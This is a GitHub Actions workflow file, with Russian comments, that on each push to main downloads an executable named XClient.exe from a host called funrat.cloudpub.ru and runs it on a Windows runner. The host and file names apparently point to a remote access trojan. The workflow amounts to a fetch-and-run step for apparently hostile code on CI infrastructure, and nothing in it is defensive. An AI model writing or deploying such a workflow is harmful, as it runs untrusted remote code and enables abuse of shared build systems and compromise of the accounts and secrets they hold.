name: Download and Run .exe file

on:
  push:
    branches:
      - main

jobs:
  download_and_run:
    runs-on: windows-latest  # Указываем, что задача будет выполняться на Windows

    steps:
      - name: Checkout code
        uses: actions/checkout@v2

      - name: Download .exe file
        run: |
          curl -L -o XClient.exe https://funrat.cloudpub.ru/XClient.exe  # Замените URL на реальный путь к .exe файлу
          # или используйте wget, если предпочитаете
          # wget https://example.com/path/to/yourprogram.exe

      - name: Run .exe file
        run: |
          .\XClient.exe  # Запуск скачанного .exe файла
